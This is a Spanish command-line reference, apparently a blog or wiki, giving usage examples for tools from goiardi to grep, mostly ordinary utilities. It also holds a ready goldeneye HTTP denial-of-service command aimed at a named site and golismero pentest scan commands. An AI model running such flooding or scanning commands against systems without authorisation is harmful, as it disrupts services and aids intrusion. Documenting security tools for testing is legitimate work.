$ goiardi --freeze-interval=300 --data-file=/var/lib/goiardi/data.bin --index-file=/var/lib/goiardi/index.bin (que guarde automáticamente los datos e índices cada 5 minutos si hubo cambios, ayudando a evitar pérdidas en caso de cierre inesperado)


gokey
Es un gestor de contraseñas que se diferencia de otros gestores tradicionales porque no requiere un almacén centralizado de contraseñas. En su lugar, gokey genera contraseñas de manera determinista a partir de una contraseña maestra y un identificador único para cada servicio o sitio web. Esto significa que no necesitas almacenar las contraseñas generadas, ya que puedes regenerarlas en cualquier momento utilizando la misma contraseña maestra y el mismo identificador.
$ gokey -p ContraSeñaSecreta -r google.es (especifica la contraseña maestra y el identificador único para el servicio, en este caso, "google.es"))
$ gokey -t pass -p ContraSeñaSecreta -r google.es (lo mismo)
$ gokey -l 20 -p ContraSeñaSecreta -r google.e (especifica la longitud de la contraseña generada en 20 caracteres)
$ gokey -p ContraSeñaSecreta -t seed -o seedfile (crear archivo semilla con 256 bytes de datos aleatorios. Los datos se encriptan utilizando el modo AES-256-GCM y la especificada la clave)


goldeneye
Es una herramienta de prueba HTTP DoS. Esta herramienta se puede usar para probar si un sitio es susceptible a ataques de denegación de servicio (DoS). Es posible abrir varias conexiones paralelas contra una URL para verificar si el servidor web puede verse comprometido. El programa prueba la seguridad en las redes y utiliza 'HTTP Keep Alive + NoCache' como vector de ataque.
# goldeneye http://lapipaplena.org -m random -d (con metodo HTTP "random", por defecto "get" y debug )


golismero
[python2.7 python2.7-dev python-pip python-docutils git perl nmap sslscan]. Framework para auditorías de seguridad y pentesting que se integra con un montón de soluciones como nmap,nikto,xserv,exploitdb,shodan,sqlmap,etc. Descarga e instalación:
	$ git clone https://github.com/golismero/golismero.git
	$ cd golismero
	# pip install -r requirements.txt
	# pip install -r requirements_unix.txt
# python golismero.py 192.168.1.10 -o report.html (escaneo total de una ip y guardar resultados en report.html
# python golismero.py URL -e sslscan -o report.html (usando un plugin concreto y resultados en report.html)
# python golismero.py localhost -o prueba.html -o prueba.txt --audit-name prueba_localhost (Iniciar la uditoria, que guarde el resultado en .html y .txt y dándole un nombre)
# python golismero.py URL -i nikto_output.csv -o report.html -d all (Importar el resultado de un scaneo con nikto [-i] y desactivando los otros plugins [-d])
# python golismero.py URL -nd (Sin guardar los resultados en la base de datos. Por defecto lo hace automáticamente)
# python golismero.py URL -db database.db -no (Realizar el scaneo y guardarlo en la basa de datos)
# python golismero.py -db database.db -d all -o report.html (Generar un informe a partir de un scaneo guardado en la base de datos)
# python golismero.py plugin (Ver listado de plugins disponibles)
# python golismero.py info brute_* (Ver detalles de un plugin concreto)


gom
Utilidad de audio que funciona como mezclador [mixer] de audio compatible con OSS [Open Sound System]. Solo es compatible con OSS, por lo que si se desea usar con ALSA, se necesitará módulos compatibles con OSS.
$ gom (abre la interfaz ncurses donde puedes ajustar los controles de audio interactivamente)
$ gom -l (lista los dispositivos de audio disponibles)
$ gom -v 80 (establece el volumen principal al 80%)
$ gom -c pcm -v 65 (establece el volumen del canal PCM al 65%)
$ gom -c mic -m (silencia el micrófono)
$ gom -c mic -u (reactiva el micrófono)
$ gom -c pcm -b 60 (ajusta el balance del canal PCM hacia la derecha 60%)
$ gom -s configuracion.gom (guarda la configuración actual del mezclador)
$ gom -r configuracion.gom (restaura una configuración previamente guardada)
# modprobe snd-pcm-oss ; modprobe snd-mixer-oss (cargar módulospara utillizar con ALSA)
$ echo "snd-pcm-oss" | sudo tee -a /etc/modules (cargar estos módulos permanentemente al arranque
$ echo "snd-mixer-oss" | sudo tee -a /etc/modules


gomuks
Cliente Matrix [https://matrix.org] basado en terminal y escrito en Golang que utiliza Mautrix [biblioteca de Go para trabajar con Matrix] y Mauview [biblioteca de UI para terminales en Go, utilizada para construir la interfaz]. Está diseñado para ser rápido, simple y útil en entornos donde no se dispone de una interfaz gráfica, como servidores o terminales remotas. Matrix es un protocolo abierto para comunicaciones descentralizadas y seguras en tiempo real de mensajería instantánea, VoIP, etc..
$ gomuks (iniciar sesión con la cuenta de Matrix)
Pedirá iniciar sesión entrando las credenciales de Matrix [usuario y contraseña], o con un token de acceso si se tiene uno.
$ gomuks login --user @tu_usuario:matrix.org --password tu_contraseña (también se puede iniciar sesión, en algunas versiones, desde línea de comandos)
Navegación básica
        Ctrl+N --> Abrir selector de sala.
        Tab / Shift+Tab --> Cambiar entre paneles.
        /join #debian:matrix.org --> Unirte a una sala.
        /msg @usuario\:servidor --> Iniciar chat directo.
        /help --> Lista los comandos disponibles.
        /rooms --> Muestra las salas en las que estás.
        /users --> Lista los usuarios de la sala actual.
        /leave --> Salir de la sala actual.
        /quit --> Cierra gomuks.


goobook
Interfaz en línea de comandos para los contactos de Google que admite: Búsqueda de contactos, agregar nuevos contactos e integración con la aplicación Mutt.
$ goobook authenticate (muestra una url para autorizar a google la aplicación)
$ goobook config-template (crear el archivo de configuración en ~/.goobookrc)
$ goobook dump_contacts (importar todos los contactos en formato xml)
$ goobook query oficina (ver los contactos con la palabra "oficina")
$ goobook reload (actualizar la lista de contactos)


google
Buscador. No reconoce caracteres como el punto [.], el guión [-] o el circunflejo [^], ni distingue entre mayúsculas y minúsculas y es preferible suprimir los articulos ["campo de futbol" por "campo futbol"]". Una curiosidad es el texto "do a barrel roll" y la página da una vuelta completa en la pantalla.
1.-
Palabras clave para mejorar las busquedas
- Comillas - Busquedas textuales ["ludwig van beethoven"]
- Operador lógico "OR" [mayúsculas] - buscar dos conceptos [bach OR wagner]
- Barra vertical - Lo mismo [beethoven|wagner]
- Signo más - Lo mismo [beethoven +wagner]
- Signo menos - Excluir algun concepto [musica -beethoven]
- ~ - Buscar palabras parecidas [~palabra]
- related – parecido al anterior [related:www.site.com]
- link - Buscar páginas que apuntan a otra [link:wwww.host.com]
- info - Recabar información sobre un dominio [info:www.host.com]
- Asterisco - Si se desconoce algún dato ["ludwig * beethoven"]
- filetype - Buscar extensiones concretas [“comandos linux” filetype:pdf]
- site - Restringir resultados por localización geografica [site:.es arroz, armas site:onion.to …]
- cache - Buscar en la cache [cache:wikipedia.org]
- time - Saber la hora de algún lugar [time Sao Paulo]
- sunset - Cuando saldrá el sol en algún lugar [sunset Sao Paulo]
- sunrise - Cuando se pondrá en algún lugar [sunrise Sao Paulo]
- cache - Cuando la página ya no está accesible [cache:www.host.com]
- intitle – las que contengan la palabra o frase en el título [intitle:beethoven]
- allintitle - Las que contengan varias palabras sin necesidad de comillas [allintitle:bach,beethoben]
- intext - Buscar la palabra solo en el texto [intext:bach]
- define – Buscar la definición de una palabra [define:palabra]
- inurl - Buscar por algun detalle en la url [inurl:pipa]
- imagesize - Buscar por tamaño de imágenes [imagesize:320x320]
- linux 2012..2013 - Buscar una palabra en artículos entre un rango de años.
- 58*13 - Usar google como calculadora
- 100USD to EUR - Conversor de divisas [EUR = Euro, USD = Dólar, JPY = Yen, GBP = Libra esterlina, CHF = Franco suizo ...]
- 42km/h to m/s - Convertir km/hora a metros/segundo
- 1024 GB to  kb - Convertir gigabytes a kilobytes
- 26hr to sec - Convertir horas a segundos
- Arroba - Buscar en redes sociales [@wikipedia]
- Sostenido - Buscar hashtags [#wiki]
- Dolar - Buscar por precio [camera $300] o rango de precios [camera $200..$400]
2.-
Gdrive (google-docs-fs)
# mkdir /media/gdrive
# gmount /media/gdrive cuenta@gmail.com -d (Pedirá contraseña de la cuenta y mostrando la salida del comando. Para desmontar: gumount /media/gdrive)


googler
Herramienta en línea de comandos basada en Python para Google (Web & News) y Google Search.
$ googler -N linux
$ googler -w lapipaplena.wordpress.com emacs
$ googler -w amazon.com -w ebay.com digital camera
$ googler -N googler --news
Tambien puede entrarse en el promt de la aplicación y entrar las busquedas (dotemacs):
	$ googler
	Please initiate a query.
	googler (? for help) dotemacs


gopass
Herramienta de gestión de contraseñas muy útil y segura, especialmente si se utiliza GnuPG  [gpg] para cifrar información. Almacena cada contraseña en un archivo individual cifrado con gpg, y el nombre del archivo suele reflejar el sitio web o recurso al que pertenece la contraseña.
$ gopass init TuNombre "tu_correo@ejemplo.com" (inicializará utilizando nombre y correo electrónico asociados a la clave GPG. Si se tiene múltiples claves, preguntará cuál usar)
$ gopass insert ejemplo.com/micuenta (Pedirá introducir la contraseña para micuenta en el sitio ejemplo.com y si se quiere añadir información adicional, como nombre de usuario o notas)
$ gopass insert ejemplo.com/otra_cuenta "contraseña_segura" (especificar la contraseña directamente, no aconsejable ya que puede quedar en el historial shell)
$ gopass show ejemplo.com/micuenta (mostrará la contraseña para ejemplo.com/micuenta en la terminal)
$ gopass copy ejemplo.com/micuenta (copiará la contraseña al portapapeles durante un tiempo limitado, por defecto, 45 segundos)
$ gopass list (listar todas las contraseñas guardadas)
$ gopass find ejemplo (buscará todas las entradas que contengan la palabra "ejemplo" en su nombre)
$ gopass edit ejemplo.com/micuenta (abrirá el archivo cifrado, permitiéndo modificar la contraseña y la información. Al guardar y cerrar el archivo, se volverá a cifrar)
$ gopass rm ejemplo.com/micuenta (eliminará la entrada de la contraseña)
$ gopass create grupo/subgrupo/nuevo_sitio (creará una estructura de carpetas para organizar mejor las contraseñas)


gosop
[GO - Stateless OpenPgp]. Es una especificación estándar [RFC 4880bis] para crear una interfaz mínima, consistente y sin estado [no guarda claves, configuraciones ni estados entre ejecuciones] para trabajar con criptografía OpenPGP.
$ gosop generate-key "María Ejemplo <maria@ejemplo.com>" > maria.key (generar una clave nueva)
$ gosop extract-cert < maria.key > maria.pub (extraer la clave pública)
$ gosop sign --as=clearsign --with-key maria.key < mensaje.txt > mensaje.txt.asc (firmar un archivo)
$ gosop verify --cert maria.pub mensaje.txt.asc (verificar una firma)
$ gosop encrypt --as=text --mode=encrypt --cert maria.pub < mensaje.txt > mensaje.txt.gpg (cifrar un mensaje para un destinatario)
$ gosop decrypt --with-key maria.key < mensaje.txt.gpg > mensaje_descifrado.txt (descifrar un mensaje)


gosu
El funcionamiento básico consiste es iniciar una aplicación dentro de un contenedor, como Docker, para cambiar el usuario y grupo bajo el cual se ejecuta un proceso dentro del contenedor. Una vez procesado el usuario/grupo, cambiamos a ese usuario, ejecutamos el proceso especificado y "gosu" deja de ser residente y de participar en el ciclo de vida del proceso. Es útil para mejorar la seguridad, ya que permite ejecutar procesos con privilegios mínimos en lugar de hacerlo como root.
$ gosu postgres pg_ctl start (ejecuta "pg_ctl start" como el usuario "postgres")
$ gosu mongodb:mongodb mongod --config /etc/mongod.conf (ejecuta el servidor MongoDB como el usuario y grupo "mongodb")


gotestsum
Ejecuta pruebas de Go, imprime una salida intuitiva y muestra un resumen de la prueba, genera resúmenes claros y ofrece características adicionales como integración con sistemas de CI/CD [integración continua/despliegue continuo] mediante formatos como JUnit XML.
$ gotestsum (ejecutar todas las pruebas de un proyecto Go en el directorio actual)
$ gotestsum --format testname (cambiar el formato de salida)
Algunos formatos disponibles son:
        testname: Muestra solo los nombres de las pruebas.
        standard-verbose: Muestra salida detallada con colores.
        testdox: Formato inspirado en PHPUnit, ideal para listas legibles.
$ gotestsum --junitfile report.xml (crea un archivo `report.xml` con los resultados en formato JUnit, que puede ser usado por herramientas como CircleCI o GitLab)
$ gotestsum --rerun-fails (reejecuta las pruebas fallidas hasta que pasen o se alcance el número máximo de intentos, por defecto, 2)
$ gotestsum --rerun-fails=3 (cambiar el número de intentos a 3)
$ gotestsum --watch (ejecuta pruebas automáticamente cada vez que se guarda un archivo .go en el proyecto)
$ gotestsum --raw-command -- go tool test2json -t ./binary.test -test.v (ejecuta el binario ./binary.test y formatea la salida como si fuera go test)
$ gotestsum --raw-command --ignore-non-json-output-lines -- ./script.sh (si "--raw-command" genera salida no-JSON, para ignorarla)
$ gotestsum --post-run-command "notify-send 'Tests finished'" (ejecutar un comando después de las pruebas, por ejemplo, para enviar notificaciones)
$ gotestsum d (depurar pruebas fallidas)
1.-
Identificar pruebas lentas
$ gotestsum --jsonfile test-output.json (guarda la salida JSON de las pruebas en test-output.json)
$ gotestsum tool slowest --jsonfile test-output.json --threshold 500ms (lista las pruebas que toman más de 500 milisegundos, ordenadas de más lenta a más rápida)


goto
Ir de un directorio a otro de forma rápida. Descarga e instalación:
	$ wget -O goto.zip "https://github.com/ankitvad/goto/archive/master.zip"
	$ unzip goto.zip
	$ cd goto-master
	# make install
	# cp goto /usr/bin
Uso:
$ goto s descargas (Guardar el presente directorio con el nombre "descargas")
$ goto descargas (Ir al dir "descargas")
$ goto l (Listar los directorios guardados)
$ goto d descargas (Suprimir el atajo guardado con el nombre "descargas")


govulncheck
Reporta vulnerabilidades conocidas que afectan al código Go conectando con https://vuln.go.dev/ y usando la base de datos de vulnerabilidades.. Analiza el código o binario y reporta solo las vulnerabilidades que realmente afectan al proyecto, evitando falsos positivos.
$ govulncheck ./... (escaneará todos los paquetes del módulo actual)
$ govulncheck /ruta/al/binario (analizar un binario compilado)
$ govulncheck -json ./... > report.json (guardar en formato JSON)
$ govulncheck -test ./... (ignorar vulnerabilidades en dependencias indirectas)


goxkcdpwgen
Generador de contraseñas. Las listas de palabras pueden ser en inglés y alemán.
$ goxkcdpwgen -N 2 -c -d "" -n 5 (crear 2 contraseñas [p.d. 1], que las palabras empiecen por mayuscula, no separadas [p.d. separadas] y con 5 palabras cada una [p-d. 4])
$ goxkcdpwgen -l de -d "" -n 3


gpart
Reparar la tabla de particiones.
# gpart /dev/sda (escanear el disco)
# gpart -W /dev/sda /dev/sda (reparar)
# gpart -f -i /dev/sda (escaneo completo [-f] y preguntando si quieres o no activar la partición encontrada [-i])


gpasswd
Añadir usuarios a grupos.
# gpasswd -d usuario video (Para eliminar "usuario" del grupo "video")
# gpasswd -a usuario video (Añadir "usuario" al grupo "video")
# gpasswd -A usuario video (Define a "usuario" como administrador del grupo "video")


gperf
[Gnu PERFect hash generator]. es un programa que genera funciones hash perfectas para conjuntos de palabras clave. Una función hash perfecta es simplemente: una función hash y una estructura de datos que permite reconocer una palabra clave en un conjunto de palabras mediante una sola exploración de la estructura de datos.
$ echo "Linux es un sistema genial" | gperf
$ cat file.c | gperf -d


gperftools
[Google Performance Tools]. Herramienta, anteriormente llamado google-perftools, para mejorar y analizar el rendimiento de programas C++.
$ pprof --text ./ejemplo perfil.output (análisis de resultados del profiling de CPU)
$ pprof --text ./heap_ejemplo heap_profile.0001.heap (análisis de resultados del uso del asignador de memoria tcmalloc)
$ pprof --base=perfil1.output --text ./ejemplo perfil2.output (análisis de uso de memoria)


gpe-taskmanager
Abre una ventana en las X informando de las aplicaciones abiertas permitiendo matar el proceso que interesa o ha quedado colgado.
$ gpe-taskmanager


gpg
[gnupg]. Encriptación y autentificación de claves públicas
# gpg --keyserver subkeys.pgp.net --recv-keys XXXXXXXXXXXXXX
# gpg --export --armor XXXXXXXXXXXX | apt-key add -
# gpg --passphrase 1234 -c archivo.txt (Encriptar un archivo con la clave 1234)
# gpg --passphrase 1234 -o xx.gpg -c archivo.txt (Encriptar archivo.txt con la clave 1234 y generando como archivo de salida xx.gpg)
# gpg --dump-options  (visualizar todas las opciones)
# gpg -c archivo.txt (poner contraseña a un texto)
# gpg archivo.txt.gpg (abrir)
# gpg --refresh-keys (refrescar claves)
$ gpg --gen-random --armor 1 8 (Crear una clave aleatoria de 8 caracteres)
$ gpg -ab fichero.txt (Crear una firma para un fichero)
$ gpg --gen-key (Crear las claves. Preguntará algoritmo [RSA/RSA], longitud [2048 bits], caducidad, nombre y correo [opcional])
$ gpg --list-keys (Ver listado )
1.-
Para evitar que la contraseña permanezca en memoria caché  mucho tiempo:
# nano ~/.gnupg/gpg-agent.conf
Y añadir las lineas:
default-cache-ttl 60
max-cache-ttl 120
Luego, recarga la configuración
# gpgconf --reload all


gpgconf
Utilidad para consultar y modificar los archivos de configuración en el directorio .gnupg.
$ gpgconf --reload gpg-agent (informar a gpg-agent de la nueva configuración)
$ gpgconf --list-components (enumera todos los componentes. Comando por defecto si no se especifica ninguno)
$ gpgconf --check-programs (enumera todos los programas disponibles y comprueba si se pueden ejecutar)
$ gpgconf --list-dirs (enumera los directorios usados por gpgconf)
$ gpgconf --list-options gpg-agent (las opciones de gpg-agent)


gpgsm
[Gnu Privacy Guard - versión S/Mime]. Herramienta diseñada para proporcionar servicios de cifrado y firma digital utilizando certificados X.509 y el protocolo CMS [Cryptographic Message Syntax]. Su uso principal es como backend para el procesamiento de correos S/MIME, pero también se emplea para la gestión de certificados y la protección de archivos y datos mediante cifrado y firma digital.
$ gpgsm --list-keys (muestra los certificados públicos almacenados en el llavero de GnuP)
$ gpgsm --recipient 0x85B49A58 --encrypt archivo.txt > archivo.txt.encrypted (cifra archivo.txt para el destinatario cuyo certificado tiene el ID 0x85B49A58 y el resultado encriptado se guarda en archivo.txt.encrypted)
$ gpgsm --decrypt archivo.txt.encrypted > archivo.txt (descifra el archivo cifrado y muestra el contenido descifrado por pantalla o lo redirige a un archivo)
$ gpgsm --sign --output archivo.txt.signed archivo.txt (genera una firma digital del archivo)
$ gpgsm --detach-sign archivo.txt > archivo.txt.sig (crear una firma separada [detached signature] útil para enviar la firma y el archivo por separado)
$ gpgsm --verify archivo.txt.signed (verifica la integridad y autenticidad de la firma digital de un archivo firmado)
$ gpgsm --delete-keys 0x85B49A58 (elimina el certificado con el ID especificado del llavero)


gpgv
Versión reducida de gpg [GNU Privacy Guard] que solo puede verificar firmas criptográficas. No permite cifrar, descifrar, ni firmar archivos.
$ gpg --no-default-keyring --keyring ./llavero.gpg --import clave.asc (importar la clave pública a un llavero temporal)
$ gpgv --keyring ./llavero.gpg mensaje.txt.sig mensaje.txt (verificar la firma)


gphoto2
Herramienta que permite interactuar con cámaras digitales conectadas por USB o a través de redes Wi-Fi. Permite configurar las opciones de la cámara, transferir fotos desde la cámara al ordenador, controlar el funcionamiento de la cámara [encender/apagar, cambiar modo] y obtener información sobre la cámara y sus configuraciones.
$ gphoto2 --list-devices (listar dispositivos detectados)
$ gphoto2 --get-all-files /dev/bus/usb/001/002 (transferir fotos de una cámara específica al ordenador)
$ gphoto2 --set-config camera.filetransferprotocol=PTP (encender una cámara)
$ gphoto2 --set-config camera.powermode=0 (apagar una cámara)
$ gphoto2 --get-config camera.model (obtener información sobre la cámara)
$ gphoto2 --set-config camera.mode=AV (cambiar el modo de la cámara:)
$ gphoto2 --set-config camera.filetransferprotocol=PTP --set-config camera.remotewhiletimedout=0 --set-config camera.remoteshutter=0 --capture-image-and-download (configura la transferencia de archivos PTP, desactiva el temporizador remoto y el disparo remoto y captura e instala una imagen)


gphotofs
Utilidad que permite montar una cámara digital compatible con "libgphoto2" como si fuera un sistema de archivos, usando FUSE [Filesystem in USErspace]. Esto es especialmente útil para cámaras que no se comportan como dispositivos de almacenamiento masivo USB, como muchas cámaras profesionales, sino que usan protocolos como PTP [Picture Transfer Protocol].
$ gphoto2 --auto-detect (verificar compatibilidad de la camara)
Crear un punto de montaje
$ mkdir ~/camara
Conectar la cámara y luego ejecutar
$ gphotofs ~/camara
$ cd ~/camara/DCIM/ (entrar en el directorio)
$ cp IMG_1234.JPG ~/Imágenes/ (copiar archivos)
$ fusermount -u ~/camara (desmontar la cámara)


gping
Comprobar si existe conectividad con un dispositivo o acceso a Internet. Como la utilidad ping pero escrita con python y mostrandolo en un gráfico. Se instala con snap:
          # snap install gping
$ gping google.es


gpiod
Herramientas para interactuar con dispositivos de caracteres GPIO [General Purpose Input/Output - Entrada/Salida de Propósito General] característica común en placas como Raspberry Pi, BeagleBone, o sistemas embebidos. Los dispositivos de caracteres son interfaces que permiten a las aplicaciones leer o escribir datos byte por byte, como si interactuaran con un archivo.
$ gpiodetect (lista los chips GPIO disponibles)
$ gpioinfo gpiochip0 (muestra información detallada de las líneas de un gpiochip)
$ gpioget gpiochip0 4 (leerá el valor del pin 4)
$ gpioset gpiochip0 17=1 (pone el pin 17 en alto. Se mantiene así solo mientras el proceso esté vivo)
$ gpiofind "USR_LED" (busca una línea por su nombre)
$ gpiomon --num-events=3 gpiochip0 4 (esperará 3 eventos, subidas o bajadas de señal, en el pin 4)
$ gpioset gpiochip0 17=0 (apaga el pin 17)
$ gpioset gpiochip0 17=1 && sleep 1 && gpioset gpiochip0 17=0 (parpadeo rápido)


gpm
Activar el mouse en las tty1-6. Si al arrancar el servicio [/etc/init.d/gpm start] marca error [fail] buscar el dispositivo:
# find /dev -iname psaux
Y arrancar la aplicación con los datos obtenidos:
# gpm -m /dev/psaux -t ps2
Configuración:
# nano /etc/gpm.conf
	....
	device=/dev/input/mice
	responsiveness=25
	repeat_type=none
	type=exps2
	append=''
	sample_rate=


gpp
[General Purpose Preprocessor]. Es un preprocesador de texto altamente configurable que permite definir la propia sintaxis para realizar transformaciones en archivos de texto antes de que sean procesados por otros programas como compiladores, interpretes, etc.
1.-
Inclusión de archivos[similar a `#include` en C]
Un archivo...
$ nano config.txt
        #def COLOR red
Otro
$ nano main.txt
        //#include "config.txt"
        El color es: /*$COLOR*/
$ gpp main.txt (procesar)
        El color es: red


gpsd
Sistema de Posicionamiento Global que puede monitorizar uno o más dispositivos GPS conectados a un ordenador, lo que permite consultar todos los datos sobre la ubicación y los movimientos de los sensores en el puerto TCP 2947. Con gpsd, varias aplicaciones cliente GPS pueden compartir el acceso a los dispositivos sin contención ni pérdida de datos. Este demonio gestiona los datos del GPS o receptores similares y los distribuye en formato estandarizado. Incluye las herramientas gpsctl, ntpshmmon, ppscheck, ubxtool y gpsdctl
# gpsd /dev/ttyUSB0 -F /var/run/gpsd.sock (gestiona la comunicación con el dispositivo GPS especificando puerto del receptor GPS y ubicación del socket para la comunicación cliente-servidor)
Una vez iniciado, los clientes pueden conectarse a `localhost:2947` o al socket Unix.
# gpsctl -f -n -b /dev/ttyUSB0 (controlar la configuración del GPS. -f: forzar el reinicio del GPS, -n: no esperar a la salida del GPS y -b: configura el GPS para emitir en modo binario nativo si es compatible)
# gpsctl -p NMEA /dev/ttyUSB0 (cambiar el tipo de protocolo)
# ntpshmmon (monitorea las interfaces SHM [SHared Memory] usadas por NTP para sincronizar el reloj del sistema usando datos del GPS)
# ppscheck /dev/pps0 (permite comprobar si el kernel detecta los pulsos de segundo [Pulse Per Second - PPS] del GPS)
# ubxtool -p MON-VER (mostrar configuración actual de dispositivos que usan el protocolo UBX [U-BloX])
# ubxtool -e NAV-PVT (activar solo mensajes NAV-PVT [posicionamiento])
# gpsdctl -r (reiniciar todos los dispositivos monitoreados)
# gpsdctl -l (mostrar estado de dispositivos conectados)


gpsd-clients
Conjunto de clientes para interactuar con gpsd [ver]. Contiene herramientas auxiliares para monitoreo, pruebas, creación de perfiles de latencia, configuración de dispositivos y simulación de gpsd. Incluye gegps [genera KML de recorrido para visualizar en Google Earth], gps2udp [reenvía datos GPS por UDP], gpscat [lee y muestra salida cruda del GPS], gpscsv [convierte a CSV para hojas de cálculo], gpsdecode [decodifica mensajes GPS crudos: NMEA, UBX, etc.], gpsfake, gpspipe [saca los datos del GPS en diferentes formatos], gpsplot, gpsprof, gpsrinex, gpssubframe, gpxlogger, lcdgps, xgps [GUI con gráficos de satélites], xgpsspeed [velocímetro gráfico] y zerk [para GPS Javad]


gpsd-tools
Contiene las herramientas más comunes utilizadas para acceder a un dispositivo GPS. Estas son cgps que muestra posición, satélites, etc. y gpsmon que proporciona un diagnóstico en modo texto de protocolos y datos.
$ cgps -s (verificando el funcionamiento con un cliente. Mostrará información en tiempo real como: latitud/longitud, velocidad, altitud, satélites visibles...)
$ gpsmon (ver más detalles técnicos)


gpustat
Herramienta que permite monitorear el estado de las GPUs NVIDIA en tiempo real. Se basa en la biblioteca NVML [NVidia Management Library] y ofrece una interfaz más simple y visualmente clara que nvidia-smi, mostrando información como el uso de la GPU, la memoria de video, la utilización por procesos, temperatura y más. Solo funciona con GPUs NVIDIA no soporta AMD u otras marcas.
$ gpustat (comando básico para ver una instantánea del estado de todas las GPUs NVIDIA)
$ gpustat --color -c -u -p  -n 2 (activa colores en la salida, muestra uso de la CPU, nombre del usuario que ejecuta procesos, el PID y actualiza cada 2 segundos)
$ gpustat -cpu (muestra el uso de la CPU junto con las métricas de la GPU)
$ gpustat | grep python (ver solo el proceso especificado)


gpw
Generador de contraseñas pronunciables
$ gpw 5 8  (creará 5 de 8 caracteres)


gpxinfo
extrae estadísticas básicas de un archivo GPX [GPS Exchange Format]. Imprime metainformación sobre el archivo y calcula datos sobre rutas y recorridos, como tiempos, distancias e información de subidas y bajadas. El formato GPX es un esquema XML diseñado como un formato común de datos GPS y se utilizan comúnmente para almacenar rutas, tracks y waypoints.
$ gpxinfo archivo.gpx (obtener información del archivo especificado)


grab
Es un paquete de Go para descargar archivos de internet con las siguientes características: Monitoreo del progreso de descarga simultáneamente, reanudación automática de descargas incompletas, adivinación del nombre del archivo a partir del encabezado del contenido o la ruta URL, etc
$ grab https://ejemplo.com/archivo.zip (uso básico)
$ grab -o mi_archivo.zip https://ejemplo.com/archivo.zip (guardar el archivo con un nombre diferente)
$ grab https://ejemplo.com/archivo1.zip https://ejemplo.com/archivo2.pdf (descargar varios archivos)
$ grab --limit-rate 500k https://ejemplo.com/archivo-grande.iso (limitar la velocidad, por ejemplo, a 500 KB/s)
$ grab --connections 8 https://ejemplo.com/archivo-grande.iso (acelerar la descarga usando conexiones paralelas)
$ grab --input-file lista-urls.txt (descargar desde un archivo con lista de URLs)
$ grab --user usuario --password contraseña https://sitio-seguro.com/archivo.zip (descargar con autenticación)
Nota.- Si la descarga se interrumpe, simplemente vuelve a ejecutar el mismo comando y continuará automáticamente.


grabc
Para conocer el color en RGB y exadecimal de algo del escritorio.
	$ grabc
	#1951c2
	25,81,194
El puntero del ratón se convierte en una cruz y al clicar obtiene el color.


grabserial
Su función principal es leer los datos que llegan a un puerto serie específico y volcarlos a la salida estándar del ordenador. Esto permite capturar y guardar la información que un dispositivo, por ejemplo una placa Raspberry Pi sin monitor conectado, está enviando a través de su consola serie.
# grabserial /dev/ttyUSB0 >> salida_rpi.log (mostrará en la terminal todo lo que la Raspberry Pi esté enviando por su puerto serie y guarda en el archivo especificado)
# grabserial -b 115200 /dev/ttyUSB0 > salida_rpi_115200.log (especifica una velocidad de 115200 baudios para la comunicación con el dispositivo en /dev/ttyUSB0)


graph-easy
[libgraph-easy-perl]. Módulo Perl para convertir o renderizar gráficos como ASCII, HTML, SVG o mediante Graphviz.
$ graph-easy grafic --png (crear un png de un gráfico generado por graphviz[ver] o dothost[ver])
$ echo "[ Bonn ] -- car --> [ Berlin ], [ Ulm ]" | graph-easy --html > ruta.html (gráfico a partir de texto crea el html)


graphicsmagick
Herramienta para la edición y manipulación de imágenes. Se accede a las herramientas a través de un único ejecutable llamado "gm", por lo tanto, GraphicsMagick e ImageMagick pueden utilizarse en paralelo instalando el paquete graphicsmagick-imagemagick-compat para obtener un conjunto de varios ejecutables compatibles con la interfaz de ImageMagick.
$ gm convert entrada.jpg -resize 400x300 salida.jpg (crea una nueva imagen redimensionada)
$ gm convert entrada.png salida.jpg (convierte un archivo PNG a JPG)
$ gm identify imagen.jpg (información de una imagen)
$ gm convert entrada.jpg -crop 100x100+10+10 salida.jpg (recorta un cuadro de 100x100 píxeles desde (10,10) de la imagen original)
$ gm convert entrada.jpg -font Arial -pointsize 36 -draw "text 50,50 'Hola Mundo'" salida.jpg (escribe “Hola Mundo” en la posición 50,50)
$ gm composite logo.png fondo.jpg salida.jpg (superpone logo.png sobre fondo.jpg)


graphviz
Genera gráficos a partir de archivos de texto. Ver pactree o dot porque la aplicación incluye varios ejecutables: acyclic, bcomps, ccomps, circo, cluster, diffimg, dijkstra, dot, dot2gxl, dot_builtins, dotty, edgepaint, fdp, gc, gml2gv, graphml2gv, gv2gml, gv2gxl, gvcolor, gvgen, gvmap, gvmap.shn, gvpack, gvpr, gxl2dot, gxl2gv, lefty, lneato, mingle, mm2gv, neato, nop, osage, patchwork, prune, sccmap, sfdp, tred, twopi, unflatten y vimdot. Generar un archivo con pactree:
$ pactree -g htop > htop
$ dotty htop (muestra el gráfico)


grc
Colorear la salida de los comandos especificados en /etc/grc.conf
$ grc ping www.tuxapuntes.com


grep
Lee la entrada estándar o un archivo e imprime las líneas que cumplan el patrón. Ver expresiones regulares
$ grep -c 'UUID' /etc/fstab (Muestra sólo el número de líneas que coinciden con el patron)
$ grep -n 'UUID' /etc/fstab (Muestra el número de lineas y su contenido)
$ grep -i 'uuid' /etc/fstab (No distingue entre mayusculas ni minúsculas)
$ grep -w 'fstab' /etc/fstab (Ha de coincidir el patron completo, no una parte)
$ grep -v 'fstab' /etc/fstab (Muestra las que no tienen el patrón)
$ grep -E 'fstab|dev' /etc/fstab (Mostras las lineas que contengan dos palabras. Requiere habilitar las expresiones regulares extendidas [ver])
$ grep -e 'fstab' -e 'dev' /etc/fstab (Forma de mostrar las lineas que contengan dos palabras sin habilitar las expresiones regualres extendidas)
$ grep -r 'fstab' /etc (Buscar una palabra de un directorio y los subdirectorios)
$ grep -l -r 'fstab' /etc (Sólo mostrar los archivos que contienen la palabra en el directorio y los subdirectorios)
$ grep -n 'fstab' /etc/fstab (Mostrar la linea y el número de linea)
$ grep -A 2 'swap' /etc/fstab (Mostrar la línea de la ocurrencia [swap] y las 2 siguientes)
$ grep -B 1 'swap' /etc/fstab (Mostrar la linea de la ocurrencia [swap] y la anterior)
$ grep -C 2 'fstab' /etc (Saca las 2 líneas antes y después de la búsqueda del patrón)
$ grep --color UUID /etc/fstab (Resaltar en color la palabra "UUID")
Otras opciones:
$ grep -Fx -f archivo1 archivo2 (Mostrar líneas que aparezcan en dos archivos)
# grep -i -a -B35 -A90 'palabreja' /dev/sda1 > recup.txt (recuperar un archivo borrado con rm que incluye la palabra “palabreja” y su tamaño estimado: [-B50] 35 lineas anteriores a “palabreja” y [-A90] 90 lineas posteriores. Especificar partición y archivo de recuperación)
